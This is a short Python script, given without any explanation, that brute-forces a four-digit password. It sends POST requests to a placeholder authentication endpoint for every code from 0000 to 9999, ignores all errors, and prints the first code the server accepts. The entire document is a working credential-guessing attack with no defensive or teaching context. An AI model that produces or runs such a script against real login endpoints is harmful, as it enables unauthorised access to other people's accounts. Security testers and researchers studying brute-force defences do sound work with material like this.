from requests import post
url = 'http://example.com/api/auth?param1=value1&param2=value2&password=%s'
for k in range(0, 10000):
    try:
        password = str(k).zfill(4)        
        if post(url % password).ok:
           print(password)
           break
    except:
        pass